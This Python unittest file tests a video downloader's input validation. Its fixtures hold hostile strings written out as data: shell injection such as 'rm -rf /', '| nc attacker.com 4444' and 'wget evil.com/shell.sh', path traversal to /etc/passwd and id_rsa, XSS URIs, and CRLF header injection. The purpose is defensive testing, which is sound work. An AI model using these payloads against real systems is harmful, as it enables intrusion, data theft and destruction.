#!/usr/bin/env python3
"""
Security Validation Tests for Video Downloader
Comprehensive test suite to validate security measures
"""

import unittest
import json
import tempfile
import os
from pathlib import Path
import sys

# Add current directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from security_utils import (
    InputValidator, SecurityError, CommandSanitizer, 
    validate_download_request
)

class TestInputValidation(unittest.TestCase):
    """Test input validation security measures"""
    
    def test_url_validation_success(self):
        """Test valid URLs pass validation"""
        valid_urls = [
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "http://example.com/video.mp4",
            "https://vimeo.com/123456789",
            "https://www.twitch.tv/videos/123456789"
        ]
        
        for url in valid_urls:
            with self.subTest(url=url):
                result = InputValidator.validate_url(url)
                self.assertEqual(result, url)
    
    def test_url_validation_command_injection(self):
        """Test URLs with command injection attempts are blocked"""
        malicious_urls = [
            "https://example.com; rm -rf /",
            "https://example.com && cat /etc/passwd",
            "https://example.com | nc attacker.com 4444",
            "https://example.com`whoami`",
            "https://example.com$(id)",
            "https://example.com;wget evil.com/shell.sh",
        ]
        
        for url in malicious_urls:
            with self.subTest(url=url):
                with self.assertRaises(SecurityError):
                    InputValidator.validate_url(url)
    
    def test_url_validation_local_access(self):
        """Test local file and network access attempts are blocked"""
        local_urls = [
            "file:///etc/passwd",
            "file://C:\\Windows\\System32\\config\\SAM",
            "http://localhost:8080/admin",
            "https://127.0.0.1/secret",
            "http://192.168.1.1/router-config",
            "https://10.0.0.1/internal",
            "http://172.16.0.1/private",
            "ftp://internal.company.com/files",
            "javascript:alert('xss')",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox('test')"
        ]
        
        for url in local_urls:
            with self.subTest(url=url):
                with self.assertRaises(SecurityError):
                    InputValidator.validate_url(url)
    
    def test_filename_validation_success(self):
        """Test valid filenames pass validation"""
        valid_filenames = [
            "my_video",
            "vacation-2023",
            "Meeting_Recording_01",
            "tutorial-part1",
            "music_mix"
        ]
        
        for filename in valid_filenames:
            with self.subTest(filename=filename):
                result = InputValidator.validate_filename(filename)
                self.assertEqual(result, filename)
    
    def test_filename_validation_path_traversal(self):
        """Test path traversal attempts are blocked"""
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\config\\SAM",
            "../../../../var/www/html/shell.php",
            "../../.ssh/id_rsa",
            "../config/database.yml",
            "\\..\\..\\sensitive_file.txt",
            "./../admin/config.php"
        ]
        
        for filename in malicious_filenames:
            with self.subTest(filename=filename):
                with self.assertRaises(SecurityError):
                    InputValidator.validate_filename(filename)
    
    def test_filename_validation_dangerous_extensions(self):
        """Test dangerous file extensions are blocked"""
        dangerous_filenames = [
            "malware.exe",
            "script.bat",
            "backdoor.sh",
            "virus.com",
            "trojan.scr",
            "keylogger.py",
            "exploit.js",
            "payload.vbs",
            "rootkit.ps1",
            "shell.cmd"
        ]
        
        for filename in dangerous_filenames:
            with self.subTest(filename=filename):
                with self.assertRaises(SecurityError):
                    InputValidator.validate_filename(filename)
    
    def test_json_validation_success(self):
        """Test valid JSON passes validation"""
        valid_json = {
            "url": "https://example.com/video.mp4",
            "sourceType": "hls",
            "headers": {"Authorization": "Bearer token123"},
            "cookies": "session=abc123; auth=xyz789",
            "referer": "https://example.com/page",
            "userAgent": "Mozilla/5.0 (compatible)"
        }
        
        json_str = json.dumps(valid_json)
        result = InputValidator.validate_json_input(json_str)
        self.assertEqual(result['url'], valid_json['url'])
    
    def test_json_validation_injection(self):
        """Test JSON injection attempts are blocked"""
        malicious_json_strings = [
            '{"url": "file:///etc/passwd"}',
            '{"url": "javascript:alert(1)"}',
            '{"url": "https://example.com", "evil": "$(rm -rf /)"}',
            '{"url": "http://localhost/admin"}',
            '{"url": "https://192.168.1.1/config"}',
        ]
        
        for json_str in malicious_json_strings:
            with self.subTest(json_str=json_str):
                with self.assertRaises(SecurityError):
                    parsed = InputValidator.validate_json_input(json_str)
                    if 'url' in parsed:
                        InputValidator.validate_url(parsed['url'])
    
    def test_header_validation_success(self):
        """Test valid headers pass validation"""
        valid_headers = {
            "Authorization": "Bearer token123",
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
            "X-Custom-Header": "value123"
        }
        
        result = InputValidator.validate_headers(valid_headers)
        self.assertEqual(len(result), len(valid_headers))
    
    def test_header_validation_injection(self):
        """Test header injection attempts are blocked"""
        malicious_headers = {
            "X-Injection": "value\r\nHost: evil.com",
            "X-CRLF": "test\nSet-Cookie: admin=true",
            "X-Evil": "value\r\nLocation: http://attacker.com"
        }
        
        with self.assertRaises(SecurityError):
            InputValidator.validate_headers(malicious_headers)
    
    def test_cookie_validation_success(self):
        """Test valid cookies pass validation"""
        valid_cookies = [
            "session=abc123; auth=xyz789",
            "user_id=12345; preferences=dark_mode",
            "token=jwt_token_here"
        ]
        
        for cookies in valid_cookies:
            with self.subTest(cookies=cookies):
                result = InputValidator.validate_cookies(cookies)
                self.assertEqual(result, cookies)
    
    def test_cookie_validation_injection(self):
        """Test cookie injection attempts are blocked"""
        malicious_cookies = [
            "session=abc123\r\nSet-Cookie: admin=true",
            "auth=token\nLocation: http://evil.com",
            "user=test\r\nHost: attacker.com"
        ]
        
        for cookies in malicious_cookies:
            with self.subTest(cookies=cookies):
                with self.assertRaises(SecurityError):
                    InputValidator.validate_cookies(cookies)

class TestDownloadRequestValidation(unittest.TestCase):
    """Test complete download request validation"""
    
    def test_simple_mode_success(self):
        """Test valid simple mode request"""
        request_data = {
            "mode": "simple",
            "url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "format": "mp4",
            "quality": "best",
            "filename": "my_video",
            "verbose": False
        }
        
        result = validate_download_request(request_data)
        self.assertEqual(result['mode'], 'simple')
        self.assertEqual(result['stream_info']['url'], request_data['url'])
    
    def test_json_mode_success(self):
        """Test valid JSON mode request"""
        json_data = {
            "url": "https://example.com/video.m3u8",
            "sourceType": "hls",
            "headers": {"Authorization": "Bearer token"},
            "cookies": "session=abc123"
        }
        
        request_data = {
            "mode": "json",
            "json_string": json.dumps(json_data),
            "format": "mp4",
            "quality": "medium",
            "filename": "stream_video",
            "verbose": True
        }
        
        result = validate_download_request(request_data)
        self.assertEqual(result['mode'], 'json')
        self.assertEqual(result['stream_info']['url'], json_data['url'])
    
    def test_malicious_request_blocked(self):
        """Test malicious requests are blocked"""
        malicious_requests = [
            {
                "mode": "simple",
                "url": "file:///etc/passwd",
                "format": "mp4"
            },
            {
                "mode": "simple", 
                "url": "https://example.com",
                "filename": "../../../shell.php"
            },
            {
                "mode": "json",
                "json_string": '{"url": "javascript:alert(1)"}',
                "format": "mp4"
            },
            {
                "mode": "json",
                "json_string": '{"url": "http://localhost/admin"}',
                "format": "mp4"
            }
        ]
        
        for request_data in malicious_requests:
            with self.subTest(request=request_data):
                with self.assertRaises(SecurityError):
                    validate_download_request(request_data)

class TestCommandSanitization(unittest.TestCase):
    """Test command sanitization and subprocess security"""
    
    def test_shell_escape(self):
        """Test shell argument escaping"""
        dangerous_args = [
            "file; rm -rf /",
            "video && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "name`whoami`",
            "file$(id)"
        ]
        
        for arg in dangerous_args:
            with self.subTest(arg=arg):
                escaped = CommandSanitizer.escape_shell_arg(arg)
                # Escaped argument should be quoted
                self.assertTrue(escaped.startswith("'") or escaped.startswith('"'))
    
    def test_command_args_validation(self):
        """Test command arguments validation"""
        safe_args = ["yt-dlp", "--format", "best", "--output", "video.mp4"]
        result = CommandSanitizer.validate_command_args(safe_args)
        self.assertEqual(result, safe_args)
        
        dangerous_args = ["yt-dlp", "--format", "best; rm -rf /"]
        with self.assertRaises(SecurityError):
            CommandSanitizer.validate_command_args(dangerous_args)

class TestSecurityLimits(unittest.TestCase):
    """Test security limits and boundaries"""
    
    def test_url_length_limit(self):
        """Test URL length limits"""
        long_url = "https://example.com/" + "a" * 3000
        with self.assertRaises(SecurityError):
            InputValidator.validate_url(long_url)
    
    def test_filename_length_limit(self):
        """Test filename length limits"""
        long_filename = "a" * 300
        with self.assertRaises(SecurityError):
            InputValidator.validate_filename(long_filename)
    
    def test_json_size_limit(self):
        """Test JSON size limits"""
        large_json = '{"url": "https://example.com", "data": "' + "x" * (2 * 1024 * 1024) + '"}'
        with self.assertRaises(SecurityError):
            InputValidator.validate_json_input(large_json)
    
    def test_header_value_limit(self):
        """Test header value length limits"""
        large_headers = {
            "X-Large": "x" * 10000
        }
        with self.assertRaises(SecurityError):
            InputValidator.validate_headers(large_headers)

def run_security_tests():
    """Run all security tests and return results"""
    print("🔒 Running Security Validation Tests...")
    print("=" * 60)
    
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add test classes
    test_classes = [
        TestInputValidation,
        TestDownloadRequestValidation, 
        TestCommandSanitization,
        TestSecurityLimits
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    print("\n" + "=" * 60)
    print("🔒 Security Test Results:")
    print(f"✅ Tests Run: {result.testsRun}")
    print(f"✅ Successes: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"❌ Failures: {len(result.failures)}")
    print(f"💥 Errors: {len(result.errors)}")
    
    if result.failures:
        print("\n❌ FAILURES:")
        for test, traceback in result.failures:
            print(f"  - {test}: {traceback.split('AssertionError:')[-1].strip()}")
    
    if result.errors:
        print("\n💥 ERRORS:")
        for test, traceback in result.errors:
            print(f"  - {test}: {traceback.split('Exception:')[-1].strip()}")
    
    success_rate = ((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun) * 100
    print(f"\n🎯 Success Rate: {success_rate:.1f}%")
    
    if success_rate == 100:
        print("🎉 ALL SECURITY TESTS PASSED! Your application is secure! 🛡️")
    else:
        print("⚠️  Some security tests failed. Please review and fix issues.")
    
    return result

if __name__ == "__main__":
    run_security_tests()